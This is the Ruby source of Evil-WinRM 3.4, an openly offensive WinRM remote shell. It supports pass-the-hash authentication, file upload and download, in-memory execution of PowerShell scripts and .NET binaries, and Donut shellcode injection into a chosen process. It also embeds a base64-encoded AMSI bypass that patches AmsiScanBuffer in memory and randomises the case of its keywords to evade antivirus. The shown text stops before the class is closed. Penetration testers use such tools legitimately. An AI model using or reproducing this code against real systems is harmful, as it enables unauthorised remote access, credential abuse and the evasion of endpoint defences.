#!/usr/bin/env ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'winrm'
require 'winrm-fs'
require 'stringio'
require 'base64'
require 'readline'
require 'optionparser'
require 'io/console'
require 'time'
require 'fileutils'
require 'logger'

# Constants

# Version
VERSION = '3.4'

# Msg types
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3
TYPE_SUCCESS = 4

# Global vars

# Available commands
$LIST = ['Bypass-4MSI', 'services', 'upload', 'download', 'menu', 'exit']
$COMMANDS = $LIST.dup
$CMDS = $COMMANDS.clone
$LISTASSEM = [''].sort
$DONUTPARAM1 = ['-process_id']
$DONUTPARAM2 = ['-donutfile']

# Colors and path completion
$colors_enabled = false
$check_rpath_completion = true

# Path for ps1 scripts and exec files
$scripts_path = ""
$executables_path = ""

# Connection vars initialization
$host = ""
$port = "5985"
$user = ""
$password = ""
$url = "wsman?PSVersion=5.1.19041.1237"
$default_service = "HTTP"
$USER_AGENT = 'Microsoft WinRM Client'
$full_logging_path = ENV["HOME"] + "/.evil-winrm-logs"

# Redefine download method from winrm-fs
module WinRM
    module FS
        class FileManager
            def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
                @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
                index = 0
                output = _output_from_file(remote_path, chunk_size, index)
                return download_dir(remote_path, local_path, chunk_size, first) if output.exitcode == 2

                return false if output.exitcode >= 1

                File.open(local_path, 'wb') do |fd|
                    out = _write_file(fd, output)
                    index += out.length
                    until out.empty?
                        if size != -1
                            yield index, size
                        end
                        output = _output_from_file(remote_path, chunk_size, index)
                        return false if output.exitcode >= 1

                        out = _write_file(fd, output)
                        index += out.length
                    end
                end
            end

            true
        end
    end
end

# Class creation
class EvilWinRM

    # Initialization
    def initialize()
        @directories = Hash.new
        @cache_ttl = 10
        @executables = Array.new
        @functions = Array.new
        @Bypass_4MSI_loaded = false
        @blank_line = false
        @bypass_amsi_words_random_case = [
            "[Runtime.InteropServices.Marshal]",
            "function ",
            "WriteByte",
            "[Ref]",
            "Assembly.GetType",
            "GetField",
            "[System.Net.WebUtility]",
            "HtmlDecode",
            "Reflection.BindingFlags",
            "NonPublic",
            "Static",
            "GetValue",
        ]
    end

    # Remote path completion compatibility check
    def completion_check()
        if $check_rpath_completion == true then
             begin
                 Readline.quoting_detection_proc
                    @completion_enabled = true
                rescue NotImplementedError, NoMethodError => err
                    @completion_enabled = false
                    # self.print_message("Remote path completions is disabled due to ruby limitation: #{err.to_s}", TYPE_WARNING)
                    # self.print_message("For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion", TYPE_DATA)
                end
        else
            @completion_enabled = false
            self.print_message("Remote path completion is disabled", TYPE_WARNING)
        end

    end

    # Arguments
    def arguments()
        options = { port:$port, url:$url, service:$service }
        optparse = OptionParser.new do |opts|
            opts.banner = "Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-b COMMAND] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]"
            opts.on("-S", "--ssl", "Enable ssl") do |val|
                $ssl = true
                options[:port] = "5986"
            end
            opts.on("-c", "--pub-key PUBLIC_KEY_PATH", "Local path to public key certificate") { |val| options[:pub_key] = val }
            opts.on("-k", "--priv-key PRIVATE_KEY_PATH", "Local path to private key certificate") { |val| options[:priv_key] = val }
            opts.on("-r", "--realm DOMAIN", "Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }") { |val| options[:realm] = val.upcase }
            opts.on("-s", "--scripts PS_SCRIPTS_PATH", "Powershell scripts local path") { |val| options[:scripts] = val }
            opts.on("--spn SPN_PREFIX", "SPN prefix for Kerberos auth (default HTTP)") { |val| options[:service] = val }
            opts.on("-e", "--executables EXES_PATH", "C# executables local path") { |val| options[:executables] = val }
            opts.on("-b", "--command COMMAND", "Run command and exit") { |val| options[:command] = val }
            opts.on("-i", "--ip IP", "Remote host IP or hostname. FQDN for Kerberos auth (required)") { |val| options[:ip] = val }
            opts.on("-U", "--url URL", "Remote url endpoint (default /wsman)") { |val| options[:url] = val }
            opts.on("-u", "--user USER", "Username (required if not using kerberos)") { |val| options[:user] = val }
            opts.on("-p", "--password PASS", "Password") { |val| options[:password] = val }
            opts.on("-H", "--hash HASH", "NTHash") do |val|
                if !options[:password].nil? and !val.nil?
                    self.print_header()
                    self.print_message("You must choose either password or hash auth. Both at the same time are not allowed", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                if !val.match /^[a-fA-F0-9]{32}$/
                    self.print_header()
                    self.print_message("Invalid hash format", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                options[:password] = "00000000000000000000000000000000:#{val}"
            end
            opts.on("-P", "--port PORT", "Remote host port (default 5985)") { |val| options[:port] = val }
            opts.on("-V", "--version", "Show version") do |val|
                puts("v#{VERSION}")
                self.custom_exit(0, false)
            end
            opts.on("-n", "--colors", "Enable colors") do |val|
                $colors_enabled = true
            end
            opts.on("-N", "--no-rpath-completion", "Disable remote path completion") do |val|
                $check_rpath_completion = false
            end
            opts.on("-l","--log","Log the WinRM session") do |val|
                $log = true
                $filepath = ""
                $logfile = ""
                $logger = ""
            end
            opts.on("-h", "--help", "Display this help message") do
                self.print_header()
                puts(opts)
                puts()
                self.custom_exit(0, false)
            end
        end

        begin
            optparse.parse!
        if options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil? then
            mandatory = [:ip, :user]
        else
            mandatory = [:ip]
        end
            missing = mandatory.select{ |param| options[param].nil? }
            unless missing.empty?
                raise OptionParser::MissingArgument.new(missing.join(', '))
            end
        rescue OptionParser::InvalidOption, OptionParser::MissingArgument
            self.print_header()
            self.print_message($!.to_s, TYPE_ERROR, true, $logger)
            puts(optparse)
            puts()
            custom_exit(1, false)
        end

        if options[:password].nil? and options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil?
            options[:password] = STDIN.getpass(prompt='Enter Password: ')
        end

        $host = options[:ip]
        $user = options[:user]
        $password = options[:password]
        $port = options[:port]
        $scripts_path = options[:scripts]
        $executables_path = options[:executables]
        $command = options[:command]
        $url = options[:url]
        $pub_key = options[:pub_key]
        $priv_key = options[:priv_key]
        $realm = options[:realm]
        $service = options[:service]
        if !$log.nil? then
            if !Dir.exists?($full_logging_path)
                Dir.mkdir $full_logging_path
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m"))
                Dir.mkdir $full_logging_path + "/" + Time.now.strftime("%Y%d%m")
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host)
                Dir.mkdir $full_logging_path+ "/" + Time.now.strftime("%Y%d%m") + "/" + $host
            end
            $filepath = $full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host + "/" + Time.now.strftime("%H%M%S")
            $logger = Logger.new($filepath)
            $logger.formatter = proc do |severity, datetime, progname, msg|
                "#{datetime}: #{msg}\n"
            end
        end
        if !$realm.nil? then
            if $service.nil? then
                $service = $default_service
            end
        end
    end

    # Print script header
    def print_header()
        #  puts()
        #  self.print_message("Evil-WinRM shell v#{VERSION}", TYPE_INFO, false)
     end

    # Generate connection object
    def connection_initialization()
        if $ssl then
            if $pub_key and $priv_key then
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl,
                    client_cert: $pub_key,
                    client_key: $priv_key,
                    user_agent: $USER_AGENT,
                )
            elsif !$realm.nil? then
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: "",
                    password: "",
                    :no_ssl_peer_verification => true,
                    transport: :kerberos,
                    realm: $realm,
                    service: $service,
                    user_agent: $USER_AGENT,
                    )
            else
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl,
                    user_agent: $USER_AGENT,
                )
            end

        elsif !$realm.nil? then
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: "",
                password: "",
                transport: :kerberos,
                realm: $realm,
                service: $service,
                user_agent: $USER_AGENT,
                )
        else
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: $user,
                password: $password,
                :no_ssl_peer_verification => true,
                user_agent: $USER_AGENT,
                )
        end
    end

    # Detect if a docker environment
    def docker_detection()
        if File.exist?("/.dockerenv") then
            return true
        else
            return false
        end
    end

    # Define colors
    def colorize(text, color = "default")
        colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35", "green" => "1;32"}
        color_code = colors[color]
        return "\001\033[0;#{color_code}m\002#{text}\001\033[0m\002"
    end

    # Messsage printing
    def print_message(msg, msg_type=TYPE_INFO, prefix_print=true, log=nil)
        if msg_type == TYPE_INFO then
            msg_prefix = "Info: "
            color = "blue"
        elsif msg_type == TYPE_WARNING then
            msg_prefix = "Warning: "
            color = "yellow"
        elsif msg_type == TYPE_ERROR then
            msg_prefix = "Error: "
            color = "red"
        elsif msg_type == TYPE_DATA then
            msg_prefix = "Data: "
            color = 'magenta'
        elsif msg_type == TYPE_SUCCESS then
            color = 'green'
        else
            msg_prefix = ""
            color = "default"
        end

        if !prefix_print then
            msg_prefix = ""
        end
        if $colors_enabled then
            puts(self.colorize("#{msg_prefix}#{msg}", color))
        else
            puts("#{msg_prefix}#{msg}")
        end

        if !log.nil?
            log.info("#{msg_prefix}#{msg}")
        end
        puts()
    end

    # Certificates validation
    def check_certs(pub_key, priv_key)
         if !File.file?(pub_key) then
            self.print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !File.file?($priv_key) then
            self.print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    # Directories validation
    def check_directories(path, purpose)
        if path == "" then
            self.print_message("The directory used for #{purpose} can't be empty. Please set a path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM).nil? then
            # Windows
            if path[-1] != "\\" then
                path.concat("\\")
            end
        else
            # Unix
            if path[-1] != "/" then
                path.concat("/")
            end
        end

        if !File.directory?(path) then
            self.print_message("The directory \"#{path}\" used for #{purpose} was not found", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if purpose == "scripts" then
            $scripts_path = path
        elsif purpose == "executables" then
            $executables_path = path
        end
    end

    # Silent warnings
    def silent_warnings
        old_stderr = $stderr
        $stderr = StringIO.new
        yield
    ensure
        $stderr = old_stderr
    end

    # Read powershell script files
    def read_scripts(scripts)
        files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) } || []
        return files.grep(/^*\.(ps1|psd1|psm1)$/)
    end

    # Read executable files
    def read_executables(executables)
        files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
        return files
    end

    # Read local files and directories names
    def paths(a_path)
        parts = self.get_dir_parts(a_path)
        my_dir = parts[0]
        grep_for = parts[1]

        my_dir = File.expand_path(my_dir)
        my_dir = my_dir + "/" unless my_dir[-1] == '/'

        files = Dir.glob("#{my_dir}*", File::FNM_DOTMATCH)
        directories = Dir.glob("#{my_dir}*").select {|f| File.directory? f}

        result = files + directories || []

        result.grep( /^#{Regexp.escape(my_dir)}#{grep_for}/i ).uniq
    end

    # Custom exit
    def custom_exit(exit_code = 0, message_print=true)
        if message_print then
            if exit_code == 0 then
                # puts()
                # self.print_message("Exiting with code #{exit_code.to_s}", TYPE_INFO, true, $logger)
            elsif exit_code == 1 then
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            elsif exit_code == 130 then
                puts()
                self.print_message("Exiting...", TYPE_INFO, true, $logger)
            else
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            end
        end
        exit(exit_code)
    end

    # Progress bar
    def progress_bar(bytes_done, total_bytes)
        progress = ((bytes_done.to_f / total_bytes.to_f) * 100).round
        progress_bar = (progress / 10).round
        progress_string = "▓" * (progress_bar-1).clamp(0,9)
        progress_string = progress_string + "▒" + ("░" * (10-progress_bar))
        message = "Progress: #{progress}% : |#{progress_string}|          \r"
        print message
    end

    # Get filesize
    def filesize(shell, path)
        size = shell.run("(get-item '#{path}').length").output.strip.to_i
        return size
    end

    # Main function
    def main
        self.arguments()
        self.connection_initialization()
        $file_manager = WinRM::FS::FileManager.new($conn)
        self.print_header()
        self.completion_check()

        # Log check
        if !$log.nil? then
            self.print_message("Logging Enabled. Log file: #{$filepath}", TYPE_WARNING, true)
        end

        # SSL checks
        if !$ssl and ($pub_key or $priv_key) then
            self.print_message("Useless cert/s provided, SSL is not enabled", TYPE_WARNING, true, $logger)
        # elsif $ssl
        #     self.print_message("SSL enabled", TYPE_WARNING)
        end

        if $ssl and ($pub_key or $priv_key) then
            self.check_certs($pub_key, $priv_key)
        end

        # Kerberos checks
         if !$user.nil? and !$realm.nil?
            self.print_message("User is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if !$password.nil? and !$realm.nil?
            self.print_message("Password is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if $realm.nil? and !$service.nil? then
            self.print_message("Useless spn provided, only used for Kerberos auth", TYPE_WARNING, true, $logger)
        end

        if !$scripts_path.nil? then
            self.check_directories($scripts_path, "scripts")
            @functions = self.read_scripts($scripts_path)
            self.silent_warnings do
                $LIST = $LIST + @functions
            end
        end

        if !$executables_path.nil? then
            self.check_directories($executables_path, "executables")
            @executables = self.read_executables($executables_path)
        end
        f = File.open(File.join(File.expand_path(File.dirname(__FILE__)), "commands.ps1"))
        menu = f.read()
        f.close()
        command = ""
        loaded = 1

        begin
            time = Time.now.to_i
            # self.print_message("Establishing connection to remote endpoint", TYPE_INFO)
            if !$command.nil? then
                shell = $conn.shell(:powershell)
                shell.run(menu)
                pwd = shell.run("(get-location).path").output.strip
                do_command(shell, $command, time, pwd)
                self.custom_exit(0)
            end
            $conn.shell(:powershell) do |shell|
                begin
                    if loaded == 0 then
                        output = shell.run(menu)
                        output = shell.run("Menu")
                        autocomplete = shell.run("auto").output.chomp
                        autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                        assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                        assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                        if !assemblyautocomplete.to_s.empty?
                            $LISTASSEMNOW = assemblyautocomplete.split("\n")
                            $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                        end
                        $LIST2 = autocomplete.split("\n")
                        $LIST = $LIST + $LIST2
                        $COMMANDS = $COMMANDS + $LIST2
                        $COMMANDS = $COMMANDS.uniq
                        loaded = 1
                    end

                    completion =
                    proc do |str|
                    case
                        when Readline.line_buffer =~ /help.*/i
                            puts("#{$LIST.join("\t")}")
                        when Readline.line_buffer =~ /Invoke-Binary.*/i
                            result = @executables.grep( /^#{Regexp.escape(str)}/i ) || []
                            if result.empty? then
                                paths = self.paths(str)
                                result.concat(paths.grep( /^#{Regexp.escape(str)}/i ))
                            end
                            result.uniq
                        when Readline.line_buffer =~ /donutfile.*/i
                            paths = self.paths(str)
                            paths.grep( /^#{Regexp.escape(str)}/i )
                        when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
                            $DONUTPARAM2.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /Donut-Loader.*/i
                            $DONUTPARAM1.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /^upload.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.paths(str) || []
                            else
                                self.complete_path(str, shell) || []
                            end
                        when Readline.line_buffer =~ /^download.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.complete_path(str, shell) || []
                            else
                                paths = self.paths(str)
                            end
                        when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ /^\"?(\.\/|\.\.\/|[a-z,A-Z]\:\/|\~\/|\/)/))
                            result = $COMMANDS.grep( /^#{Regexp.escape(str)}/i ) || []
                            result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
                            result.uniq
                        else
                            result = Array.new
                            result.concat(self.complete_path(str, shell) || [])
                            result
                        end
                    end

                    Readline.completion_proc = completion
                    Readline.completion_append_character = ''
                    Readline.completion_case_fold = true
                    Readline.completer_quote_characters = "\""

                    until command == "exit" do
                        pwd = shell.run("(get-location).path").output.strip

                        if $colors_enabled then
                            command = Readline.readline(self.colorize("PS ", "yellow") + pwd + "> ", true)
                        else
                            command = Readline.readline("PS " + pwd + "> ", true)
                        end

                        if command.nil? then
                            puts
                            self.custom_exit(0)
                        end

                        if !$logger.nil?
                            $logger.info("PS #{pwd} > #{command}")
                        end

                        do_command(shell, command, time, pwd)
                    end
                rescue Errno::EACCES => ex
                    puts()
                    self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
                    retry
                rescue Interrupt
                    puts("\n\n")
                    self.print_message("Press \"y\" to exit, press any other key to continue", TYPE_WARNING, true, $logger)
                    if STDIN.getch.downcase == "y"
                        self.custom_exit(130)
                    else
                        retry
                    end
                end
            self.custom_exit(0)
        end
        rescue SystemExit
        rescue SocketError
            self.print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        rescue Exception => ex
            self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    def do_command(shell, command, time, pwd)
        if command.start_with?('upload') then
            if self.docker_detection() then
                puts()
                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
            end

            begin
                paths = self.get_upload_paths(command, pwd)
                right_path = paths.pop
                left_path = paths.pop

                self.print_message("Uploading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                $file_manager.upload(left_path, right_path) do |bytes_copied, total_bytes|
                    self.progress_bar(bytes_copied, total_bytes)
                    if bytes_copied == total_bytes then
                        puts("                                                             ")
                        self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA, true, $logger)
                        self.print_message("Upload successful!", TYPE_INFO, true, $logger)
                    end
                end
            rescue StandardError => err
                self.print_message("#{err.to_s}: #{err.backtrace}", TYPE_ERROR, true, $logger)
                self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR, true, $logger)
            ensure
                command = ""
            end
        elsif command.start_with?('download') then
            if self.docker_detection() then
                puts()
                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
            end

            begin
                paths = self.get_download_paths(command, pwd)
                right_path = paths.pop
                left_path = paths.pop

                self.print_message("Downloading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                size = self.filesize(shell, left_path)
                $file_manager.download(left_path, right_path, size: size) do | index, size |
                    self.progress_bar(index, size)
                end
                puts("                                                             ")
                self.print_message("Download successful!", TYPE_INFO, true, $logger)
            rescue StandardError => err
                self.print_message("Download failed. Check filenames or paths", TYPE_ERROR, true, $logger)
            ensure
                command = ""
            end
        elsif command.start_with?('Invoke-Binary') then
            begin
                invoke_Binary = command.tokenize
                command = ""
                if !invoke_Binary[1].to_s.empty? then
                    load_executable = invoke_Binary[1]
                    load_executable = File.binread(load_executable)
                    load_executable = Base64.strict_encode64(load_executable)
                    if !invoke_Binary[2].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + " ," + invoke_Binary[2])
                        puts(output.output)
                    elsif invoke_Binary[2].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable)
                        puts(output.output)
                    end
                elsif
                    output = shell.run("Invoke-Binary")
                    puts(output.output)
                end
            rescue StandardError => err
                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
            end

        elsif command.start_with?('exit') then
            return 1

        elsif command.start_with?('Donut-Loader') then
            begin
                donut_Loader = command.tokenize
                command = ""
                if !donut_Loader[4].to_s.empty? then
                    pid = donut_Loader[2]
                    load_executable = donut_Loader[4]
                    load_executable = File.binread(load_executable)
                    load_executable = Base64.strict_encode64(load_executable)
                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
                elsif
                    output = shell.run("Donut-Loader")
                end
                print(output.output)
                if !$logger.nil?
                    $logger.info(output.output)
                end
            rescue
                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
            end

        elsif command.start_with?('services') then
            command = ""
            output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
            print(output.output.chomp)
            if !$logger.nil?
                $logger.info(output.output.chomp)
            end
        elsif command.start_with?(*@functions) then
            self.silent_warnings do
                load_script = $scripts_path + command
                command = ""
                load_script = load_script.gsub(" ","")
                load_script = File.binread(load_script)
                load_script = Base64.strict_encode64(load_script)
                script_split = load_script.scan(/.{1,5000}/)
                script_split.each do |item|
                    output = shell.run("$a += '#{item}'")
                end
                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
                output = shell.run("$a = $null")
            end

        elsif command.start_with?('menu') then
            command = ""
            self.silent_warnings do
                output = shell.run("Menu")
                autocomplete = shell.run("auto").output.chomp
                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                if !assemblyautocomplete.to_s.empty?
                    $LISTASSEMNOW = assemblyautocomplete.split("\n")
                    $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                end
                $LIST2 = autocomplete.split("\n")
                $LIST = $LIST + $LIST2
                $COMMANDS = $COMMANDS + $LIST2
                $COMMANDS = $COMMANDS.uniq
                message_output = output.output.chomp("\n") + "[+] " + $CMDS.join("\n").gsub(/\n/, "\n[+] ") + "\n\n"
                puts(message_output)
                if !$logger.nil?
                    $logger.info(message_output)
                end
            end

        elsif (command == "Bypass-4MSI")
            command = ""
            timeToWait = (time + 20) - Time.now.to_i

            if timeToWait > 0
                puts()
                self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING, true, $logger)
                @blank_line = true
                sleep(timeToWait)
            end
            if !@Bypass_4MSI_loaded
                self.load_Bypass_4MSI(shell)
                @Bypass_4MSI_loaded = true
            end
        end
        output = shell.run(command) do |stdout, stderr|
            stdout&.each_line do |line|
                STDOUT.puts(line.rstrip.dump[1..].chop)
            end
            stderr&.each_line do |line|
                STDOUT.puts(line.rstrip.dump[1..].chop)
            end
        end
        if !$logger.nil? && !command.empty?
            output_logger=""
            output.output.each_line do |line|
                output_logger += "#{line.rstrip!}\n"
            end
            $logger.info(output_logger)
        end
    end

    def random_string(len=3)
        Array.new(len){ [*'0'..'9',*'A'..'Z',*'a'..'z'].sample }.join
    end

    def random_case(word)
        word.chars.map { |c| (rand 2) == 0 ? c : c.upcase }.join
    end

    def get_char_expresion(the_char)
        rand_val = rand(10000) + rand(100)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")

        return "[#{char_val}](#{val.to_s}-#{rand_val.to_s})"
    end

    def get_byte_expresion(the_char)
        rand_val = rand(30..120)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")
        byte_val = self.random_case("byte")

        return "[#{char_val}]([#{byte_val}] 0x#{val.to_s(16)}-0x#{rand_val.to_s(16)})"
    end

    def get_char_raw(the_char)
        return "\"#{the_char}\""
    end

    def generate_random_type_string()
        to_randomize = "AmsiScanBuffer"
        result = ""
        to_randomize.chars.each { |c| result +=  "+#{(rand 2) == 0 ? (rand 2) == 0 ? self.get_char_raw(c): self.get_byte_expresion(c) : self.get_char_expresion(c)}"}
        result[1..-1]
    end

    def get_Bypass_4MSI()
        bypass_template = "JGNvZGUgPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIGNvZGUgewogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBydW9xeHAsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cn0KIkAKQWRkLVR5cGUgJGNvZGUKJGZqdGZxd24gPSBbY29kZV06OkxvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpCiNqdW1wCiRqeXV5amcgPSBbY29kZV06OkdldFByb2NBZGRyZXNzKCRmanRmcXduLCAiIiskdmFyMSsiIikKJHAgPSAwCiNqdW1wCiRudWxsID0gW2NvZGVdOjpWaXJ0dWFsUHJvdGVjdCgkanl1eWpnLCBbdWludDMyXTUsIDB4NDAsIFtyZWZdJHApCiRmbnh5ID0gIjB4QjgiCiRmbXh5ID0gIjB4NTciCiRld2FxID0gIjB4MDAiCiR3ZnRjID0gIjB4MDciCiRuZHVnID0gIjB4ODAiCiRobXp4ID0gIjB4QzMiCiNqdW1wCiRsbGZhbSA9IFtCeXRlW11dICgkZm54eSwkZm14eSwkZXdhcSwkd2Z0YywrJG5kdWcsKyRobXp4KQokbnVsbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGxsZmFtLCAwLCAkanl1eWpnLCA2KSA="
        dec_template = Base64.decode64(bypass_template)
        result = dec_template.gsub("$var1", self.generate_random_type_string())
        @bypass_amsi_words_random_case.each {|w| result.gsub!("#{w}", self.random_case(w)) }
        result
    end

    def load_Bypass_4MSI(shell)
        bypass = self.get_Bypass_4MSI()

        if !@blank_line then
            puts()
        end
        self.print_message("Patching 4MSI, please be patient...", TYPE_INFO, true)
        bypass.split("#jump").each do |item|
            output = shell.run(item)
            sleep(2)
        end

        output = shell.run(bypass)
        if output.output.empty? then
            self.print_message("[+] Success!", TYPE_SUCCESS, false)
        else
            puts(output.output)
        end
    end

    def extract_filename(path)
        path.split('/')[-1]
    end

    def extract_next_quoted_path(cmd_with_quoted_path)
        begin_i = cmd_with_quoted_path.index("\"")
        l_total = cmd_with_quoted_path.length()
        next_i = cmd_with_quoted_path[begin_i +1, l_total - begin_i].index("\"")
        result = cmd_with_quoted_path[begin_i +1, next_i]
        result
    end

    def get_upload_paths(upload_command, pwd)
        quotes = upload_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = upload_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(upload_command)
            upload_command = upload_command.gsub("\"#{quoted_path}\"", '')
            result = upload_command.split(' ')
            result.delete_at(0)
            result.push(quoted_path) unless quoted_path.nil? || quoted_path.empty?
        end
        result.push("#{pwd}\\#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_download_paths(download_command, pwd)
        quotes = download_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = download_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(download_command)
            download_command = download_command.gsub("\"#{quoted_path}\"", '')
            result.push(quoted_path)
            rest = download_command.split(' ')
            unless rest.nil? || rest.empty?
                rest.delete_at(0)
                result.push(rest[0]) if rest.length == 1
            end
        end

        result.push("./#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_from_cache(n_path)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            current_vals = @directories[a_path]
            result = Array.new
            unless current_vals.nil? then
                is_valid = current_vals['time'] > current_time - @cache_ttl
                result = current_vals['files'] if is_valid
                @directories.delete(a_path) unless is_valid
            end

            return result
        end
    end

    def set_cache(n_path, paths)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            @directories[a_path] = { 'time' => current_time, 'files' => paths }
        end
    end

    def normalize_path(str)
        Regexp.escape(str.to_s.gsub('\\', '/'))
    end

